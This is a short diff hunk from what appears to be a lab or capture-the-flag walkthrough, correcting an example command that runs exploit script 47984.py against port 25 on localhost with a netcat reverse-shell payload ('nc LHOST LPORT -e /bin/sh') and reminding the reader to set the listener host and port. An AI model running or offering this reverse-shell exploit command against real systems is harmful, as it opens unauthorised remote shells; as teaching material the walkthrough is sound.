@@ -270,7 +270,7 @@ To run the script
 
 Our command would look like this
 
-command:```python3 47984.py 127.0.0.1 'nc LHOST LPORT -e /bin/sh'```
+command:```python3 47984.py 127.0.0.1 25 'nc LHOST LPORT -e /bin/sh'```
 
 Ensure you edit the ```LHOST``` and ```LPORT```
 
